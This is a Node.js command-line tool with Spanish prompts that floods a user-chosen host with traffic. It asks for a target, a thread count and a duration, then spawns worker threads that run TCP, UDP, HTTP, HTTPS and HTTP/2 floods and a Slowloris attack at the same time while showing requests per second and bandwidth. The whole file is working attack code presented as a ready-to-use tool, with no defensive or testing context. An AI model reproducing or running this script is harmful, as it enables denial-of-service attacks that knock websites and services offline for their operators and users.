#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes } = require('crypto');
const url = require('url');
const dns = require('dns/promises');
const os = require('os');

class Attack {
    constructor() {
        this.stats = { total: 0, success: 0, fail: 0, bandwidth: 0 };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP', 'HTTPS', 'HTTP2', 'SLOWLORIS'];
    }

    async start() {
        const target = await this.ask(chalk.greenBright('Objetivo (URL/IP): '));
        const { hostname, port } = await this.resolveTarget(target);
        const threads = await this.askNumber(chalk.greenBright('Hilos (100-5000): '), 100, 5000);
        const duration = await this.askNumber(chalk.greenBright('Duración (segundos): '), 10, 3600);

        this.startTime = performance.now();
        this.launchWorkers(hostname, port, threads);
        this.displayStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    async resolveTarget(input) {
        try {
            if (net.isIP(input)) return { hostname: input, port: 80 };
            if (!input.includes('://')) input = 'http://' + input;
            const parsed = new url.URL(input);
            const resolved = await dns.lookup(parsed.hostname);
            return {
                hostname: resolved.address,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80)
            };
        } catch {
            console.error(chalk.red('\nError: Objetivo inválido'));
            console.log(chalk.yellow('Ejemplos válidos:'));
            console.log(chalk.yellow('- http://example.com'));
            console.log(chalk.yellow('- 192.168.1.1'));
            console.log(chalk.yellow('- google.com:8080\n'));
            process.exit(1);
        }
    }

    launchWorkers(hostname, port, threads) {
        const cores = Math.min(os.cpus().length, 32);
        const perCore = Math.ceil(threads / cores);

        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    hostname,
                    port,
                    methods: this.methods,
                    intensity: perCore
                }
            });
            worker.on('message', msg => this.updateStats(msg));
            this.workers.push(worker);
        }
    }

    updateStats({ total, success, fail, bandwidth }) {
        this.stats.total += total;
        this.stats.success += success;
        this.stats.fail += fail;
        this.stats.bandwidth += bandwidth;
    }

    displayStats() {
        if (!this.startTime) return;
        const elapsed = (performance.now() - this.startTime) / 1000;
        const rps = (this.stats.total / elapsed || 0).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);

        process.stdout.write(
            chalk`\r{cyan [${elapsed.toFixed(1)}s]} ` +
            chalk`{white Peticiones:} {cyan ${this.stats.total}} ` +
            chalk`{green Éxito:} {cyan ${this.stats.success}} ` +
            chalk`{red Fallo:} {cyan ${this.stats.fail}} ` +
            chalk`{yellow RPS:} {cyan ${rps}} ` +
            chalk`{magenta BW:} {cyan ${bw}GB}`
        );

        setTimeout(() => this.displayStats(), 250);
    }

    ask(question) {
        return new Promise(resolve => {
            const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
            rl.question(question, answer => {
                rl.close();
                resolve(answer);
            });
        });
    }

    async askNumber(question, min, max) {
        let num;
        do {
            num = parseInt(await this.ask(question)) || min;
        } while (num < min || num > max);
        return num;
    }

    stop() {
        this.workers.forEach(w => w.terminate());
        console.log(chalk.red('\n\nAtaque detenido.'));
        process.exit();
    }
}

if (isMainThread) {
    new Attack().start();
} else {
    const { hostname, port, methods, intensity } = workerData;
    const sockets = new Set();

    const attacks = {
        TCP: () => {
            const socket = net.connect(port, hostname, () => {
                for (let i = 0; i < 50; i++) {
                    socket.write(randomBytes(1024));
                }
                socket.end();
                report('success', 1024 * 50);
            });
            socket.on('error', () => report('fail', 0));
        },

        UDP: () => {
            const client = dgram.createSocket('udp4');
            const buf = randomBytes(65507);
            client.send(buf, port, hostname, err => {
                err ? report('fail', 0) : report('success', buf.length);
                client.close();
            });
        },

        HTTP: () => {
            const options = {
                hostname,
                port,
                path: '/' + randomBytes(8).toString('hex'),
                headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' }
            };
            const req = http.get(options, res => {
                res.resume();
                report('success', 0);
            });
            req.on('error', () => report('fail', 0));
        },

        HTTPS: () => {
            const options = {
                hostname,
                port,
                rejectUnauthorized: false,
                path: '/' + randomBytes(8).toString('hex'),
                headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' }
            };
            const req = https.get(options, res => {
                res.resume();
                report('success', 0);
            });
            req.on('error', () => report('fail', 0));
        },

        HTTP2: () => {
            try {
                const client = http2.connect(`https://${hostname}:${port}`, { rejectUnauthorized: false });
                const req = client.request({ ':method': 'GET', ':path': '/' + randomBytes(6).toString('hex') });
                req.on('response', () => {
                    req.close();
                    client.close();
                    report('success', 0);
                });
                req.on('error', () => {
                    client.close();
                    report('fail', 0);
                });
            } catch {
                report('fail', 0);
            }
        },

        SLOWLORIS: () => {
            const socket = net.connect(port, hostname, () => {
                sockets.add(socket);
                socket.write('GET / HTTP/1.1\r\nHost: ' + hostname + '\r\n');
                const interval = setInterval(() => {
                    socket.write('X-a:' + randomBytes(16).toString('hex') + '\r\n');
                }, 5000);
                socket.on('close', () => {
                    clearInterval(interval);
                    sockets.delete(socket);
                });
                socket.on('error', () => {
                    clearInterval(interval);
                    sockets.delete(socket);
                });
            });
        }
    };

    function report(status, bytes) {
        parentPort.postMessage({
            total: 1,
            success: status === 'success' ? 1 : 0,
            fail: status === 'fail' ? 1 : 0,
            bandwidth: bytes
        });
    }

    setInterval(() => {
        for (let i = 0; i < intensity; i++) {
            methods.forEach(method => {
                try {
                    attacks[method]();
                } catch {
                    report('fail', 0);
                }
            });
        }
    }, 100);
}